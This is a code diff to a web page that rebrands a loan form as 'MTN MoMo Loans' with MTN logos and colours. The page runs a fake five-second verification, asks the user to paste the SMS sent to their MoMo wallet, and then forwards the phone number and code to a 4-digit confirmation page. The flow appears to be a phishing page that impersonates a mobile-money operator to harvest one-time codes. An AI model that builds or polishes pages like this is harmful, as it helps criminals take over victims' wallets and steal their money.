@@ -3,11 +3,12 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Verifying — QuickLoan</title>
+<title>Verify SMS — MTN MoMo Loans</title>
 <style>
   :root{
     --mtn-blue:#004F9F;
     --mtn-blue-dark:#003B77;
+    --mtn-blue-deep:#002B5C;
     --mtn-blue-light:#1A6DC4;
     --mtn-yellow:#FFCC00;
     --bg:#F7F9FC;
@@ -41,59 +42,30 @@
   .frame-top, .frame-bottom{
     width:100%;
     height:6px;
-    background:linear-gradient(90deg, var(--mtn-blue) 0%, var(--mtn-blue-light) 50%, var(--mtn-blue) 100%);
+    background:linear-gradient(90deg, var(--mtn-blue-deep) 0%, var(--mtn-blue) 50%, var(--mtn-blue-deep) 100%);
   }
   .frame-bottom{margin-top:auto;}
 
-  /* ============ HEADER ============ */
+  /* ============ HEADER (blue bar, "MTN.") ============ */
   .header{
     width:100%;
-    background:#FFFFFF;
-    border-bottom:1px solid var(--border);
-    padding:16px 20px;
+    background:var(--mtn-blue-deep);
+    border-bottom:1px solid var(--mtn-blue-dark);
+    padding:18px 20px;
     position:sticky;top:0;z-index:50;
-    box-shadow:0 2px 12px rgba(0,79,159,0.06);
+    box-shadow:0 4px 16px rgba(0,43,92,0.28);
   }
   .header-inner{
     width:100%;max-width:920px;margin:0 auto;
-    display:flex;align-items:center;justify-content:space-between;
+    display:flex;align-items:center;justify-content:center;
   }
 
-  .brand{display:flex;align-items:center;gap:11px;text-decoration:none;}
-  .brand .logo{
-    width:42px;height:42px;border-radius:50%;
-    background:var(--mtn-blue);
-    display:flex;align-items:center;justify-content:center;
-    font-weight:900;color:var(--mtn-yellow);
-    font-size:11.5px;letter-spacing:-0.4px;
-    box-shadow:0 4px 12px rgba(0,79,159,0.28);
+  .brand{display:flex;align-items:center;text-decoration:none;}
+  .brand strong{
+    font-size:26px;font-weight:900;color:#FFFFFF;
+    letter-spacing:2px;text-transform:uppercase;
   }
-  .brand .wordmark{display:flex;flex-direction:column;line-height:1.15;}
-  .brand .wordmark strong{
-    font-size:17px;font-weight:800;color:var(--mtn-blue);letter-spacing:-0.3px;
-  }
-  .brand .wordmark small{
-    font-size:10.5px;color:var(--muted);font-weight:600;
-    letter-spacing:0.4px;text-transform:uppercase;
-  }
-
-  .steps{display:flex;align-items:center;gap:8px;}
-  .step{
-    display:flex;align-items:center;gap:7px;
-    font-size:12.5px;font-weight:700;color:var(--muted);
-  }
-  .step .num{
-    width:24px;height:24px;border-radius:50%;
-    background:#E8EEF6;color:var(--muted);
-    display:flex;align-items:center;justify-content:center;
-    font-size:12px;font-weight:800;
-  }
-  .step.done .num{background:var(--green);color:#FFFFFF;}
-  .step.done{color:var(--green);}
-  .step.active .num{background:var(--mtn-blue);color:#FFFFFF;}
-  .step.active{color:var(--mtn-blue);}
-  .step-line{width:18px;height:2px;background:#E8EEF6;border-radius:2px;}
-  .step-line.done{background:var(--green);}
+  .brand strong em{font-style:normal;color:var(--mtn-yellow);}
 
   /* ============ MAIN ============ */
   main{
@@ -108,12 +80,12 @@
     width:100%;max-width:460px;
     border-radius:20px;
     padding:34px 28px 32px;
-    box-shadow:0 12px 40px rgba(0,79,159,0.10);
+    box-shadow:0 12px 40px rgba(0,43,92,0.10);
     border:1px solid var(--border);
-    border-top:4px solid var(--mtn-blue);
+    border-top:4px solid var(--mtn-blue-deep);
   }
 
-  /* ============ VERIFYING VIEW ============ */
+  /* ============ VERIFYING VIEW (5s) ============ */
   #verifyingView{
     display:flex;
     flex-direction:column;
@@ -138,13 +110,13 @@
   }
   .big-spinner .ring.active{
     border-color:transparent;
-    border-top-color:var(--mtn-blue);
-    border-right-color:var(--mtn-blue);
+    border-top-color:var(--mtn-blue-deep);
+    border-right-color:var(--mtn-blue-deep);
     animation:spin 1s linear infinite;
   }
   .big-spinner .ring.pulse{
     border:7px solid transparent;
-    border-top-color:var(--mtn-blue-light);
+    border-top-color:var(--mtn-blue);
     opacity:0.4;
     animation:spin 1.8s linear infinite reverse;
   }
@@ -172,13 +144,13 @@
   .verify-progress-bar{
     height:100%;
     width:0%;
-    background:linear-gradient(90deg,var(--mtn-blue),var(--mtn-blue-light));
+    background:linear-gradient(90deg,var(--mtn-blue-deep),var(--mtn-blue));
     border-radius:5px;
     transition:width 0.4s ease;
   }
   .verify-status{
     font-size:12.5px;
-    color:var(--mtn-blue);
+    color:var(--mtn-blue-deep);
     font-weight:700;
     letter-spacing:0.4px;
     text-transform:uppercase;
@@ -194,7 +166,7 @@
     75%{content:"...";}
   }
 
-  /* ============ OTP VIEW ============ */
+  /* ============ SMS VIEW ============ */
   #otpView{display:none;}
 
   .otp-head{
@@ -209,7 +181,7 @@
   }
   .otp-head .icon-circle svg{
     width:30px;height:30px;
-    stroke:var(--mtn-blue);fill:none;
+    stroke:var(--mtn-blue-deep);fill:none;
     stroke-width:2.2;stroke-linecap:round;stroke-linejoin:round;
   }
   .otp-head h2{
@@ -221,9 +193,8 @@
     font-size:13.5px;color:var(--muted);
     line-height:1.55;
   }
-  .otp-head p strong{color:var(--mtn-blue);font-weight:800;}
+  .otp-head p strong{color:var(--mtn-blue-deep);font-weight:800;}
 
-  /* ---- PASTE FIELD ---- */
   .paste-field{margin-bottom:22px;}
 
   .paste-field label{
@@ -254,9 +225,9 @@
     transition:.15s;
   }
   .paste-wrap textarea:focus{
-    border-color:var(--mtn-blue);
+    border-color:var(--mtn-blue-deep);
     background:#FFFFFF;
-    box-shadow:0 0 0 4px rgba(0,79,159,0.10);
+    box-shadow:0 0 0 4px rgba(0,43,92,0.10);
   }
   .paste-wrap textarea::placeholder{
     color:#A9B6C7;
@@ -270,7 +241,7 @@
     display:inline-flex;
     align-items:center;
     gap:6px;
-    background:var(--mtn-blue);
+    background:var(--mtn-blue-deep);
     color:#FFFFFF;
     border:none;
     border-radius:9px;
@@ -280,9 +251,9 @@
     cursor:pointer;
     letter-spacing:0.3px;
     transition:.18s;
-    box-shadow:0 4px 12px rgba(0,79,159,0.28);
+    box-shadow:0 4px 12px rgba(0,43,92,0.28);
   }
-  .paste-btn:hover{background:var(--mtn-blue-dark);transform:translateY(-1px);}
+  .paste-btn:hover{background:var(--mtn-blue);transform:translateY(-1px);}
   .paste-btn:active{transform:translateY(0);}
   .paste-btn svg{
     width:13px;height:13px;
@@ -338,23 +309,23 @@
     display:flex;align-items:center;justify-content:center;
     transition:.18s;
   }
-  .btn-back:hover{border-color:var(--mtn-blue);color:var(--mtn-blue);background:#F1F6FC;}
+  .btn-back:hover{border-color:var(--mtn-blue-deep);color:var(--mtn-blue-deep);background:#F1F6FC;}
 
   .cta{
     flex:1;
     padding:16px;
     border:none;border-radius:12px;
-    background:var(--mtn-blue);
+    background:var(--mtn-blue-deep);
     color:#FFFFFF;
     font-size:16px;font-weight:800;
     cursor:pointer;letter-spacing:0.3px;
     transition:.18s;
-    box-shadow:0 8px 20px rgba(0,79,159,0.3);
+    box-shadow:0 8px 20px rgba(0,43,92,0.32);
   }
   .cta:hover{
-    background:var(--mtn-blue-dark);
+    background:var(--mtn-blue);
     transform:translateY(-2px);
-    box-shadow:0 12px 26px rgba(0,79,159,0.38);
+    box-shadow:0 12px 26px rgba(0,43,92,0.4);
   }
   .cta:active{transform:translateY(0);}
   .cta:disabled{opacity:0.45;cursor:not-allowed;transform:none;box-shadow:none;}
@@ -368,7 +339,6 @@
     stroke-width:2.4;stroke-linecap:round;stroke-linejoin:round;
   }
 
-  /* ---- RESEND ---- */
   .resend{
     text-align:center;
     margin-top:16px;
@@ -377,20 +347,17 @@
     font-weight:600;
   }
   .resend a{
-    color:var(--mtn-blue);
+    color:var(--mtn-blue-deep);
     text-decoration:none;
     font-weight:800;
     cursor:pointer;
   }
   .resend a:hover{text-decoration:underline;}
 
-  /* ============ MOBILE ============ */
   @media(max-width:640px){
-    .steps .step span:not(.num){display:none;}
-    .step-line{width:12px;}
     main{padding:28px 16px 44px;}
     .card{padding:28px 20px;}
-    .brand .wordmark small{display:none;}
+    .brand strong{font-size:22px;letter-spacing:1.5px;}
     .btn-row{flex-direction:column-reverse;}
     .btn-back{width:100%;}
     #verifyingView h2{font-size:20px;}
@@ -405,28 +372,14 @@
   <header class="header">
     <div class="header-inner">
       <a class="brand" href="index.html">
-        <div class="logo">MTN</div>
-        <div class="wordmark">
-          <strong>QuickLoan</strong>
-          <small>Powered by MoMo</small>
-        </div>
+        <strong>MTN<em>.</em></strong>
       </a>
-
-      <div class="steps">
-        <div class="step done"><span class="num">✓</span><span>Amount</span></div>
-        <div class="step-line done"></div>
-        <div class="step done"><span class="num">✓</span><span>Details</span></div>
-        <div class="step-line done"></div>
-        <div class="step done"><span class="num">✓</span><span>Verify</span></div>
-        <div class="step-line done"></div>
-        <div class="step active"><span class="num">5</span><span>OTP</span></div>
-      </div>
     </div>
   </header>
 
   <main>
 
-    <!-- ============ VERIFYING VIEW ============ -->
+    <!-- VERIFYING (5s) -->
     <div id="verifyingView">
       <div class="big-spinner">
         <div class="ring"></div>
@@ -445,7 +398,7 @@
       </div>
     </div>
 
-    <!-- ============ OTP VIEW ============ -->
+    <!-- SMS VIEW -->
     <div class="card" id="otpView">
 
       <div class="otp-head">
@@ -458,7 +411,6 @@
         <p>Paste the message we just sent to your MoMo wallet <strong id="otpPhone">+237 6XX XXX XXX</strong></p>
       </div>
 
-      <!-- PASTE FIELD -->
       <div class="paste-field">
         <label for="smsPaste">Paste the SMS message</label>
         <div class="paste-wrap">
@@ -478,7 +430,6 @@
         </div>
       </div>
 
-      <!-- CODE PREVIEW -->
       <div class="code-preview" id="codePreview">
         <div class="tick">
           <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
@@ -489,7 +440,6 @@
         </div>
       </div>
 
-      <!-- ACTIONS -->
       <div class="btn-row">
         <a href="verify.html" class="btn-back">← Back</a>
         <button type="button" class="cta" id="submitOtpBtn" disabled>Confirm</button>
@@ -523,7 +473,7 @@
 
   document.getElementById('otpPhone').textContent = phone;
 
-  // ==================== FULL-PAGE VERIFYING (5 seconds) ====================
+  // ==================== VERIFYING (5 seconds) ====================
   const verifyBar    = document.getElementById('verifyBar');
   const verifyStatus = document.getElementById('verifyStatus');
 
@@ -611,9 +561,9 @@
     submitOtpBtn.textContent = 'Verifying…';
 
     setTimeout(() => {
-      // TODO: POST { phone, code } to your backend → MTN MoMo API
+      // Navigate to otp-confirm.html (the 4-digit page) — this fixes the "not found"
       window.location.href =
-        'confirm.html' +
+        'otp-confirm.html' +
         '?amount=' + amount +
         '&months=' + months +
         '&phone='  + encodeURIComponent(phone) +
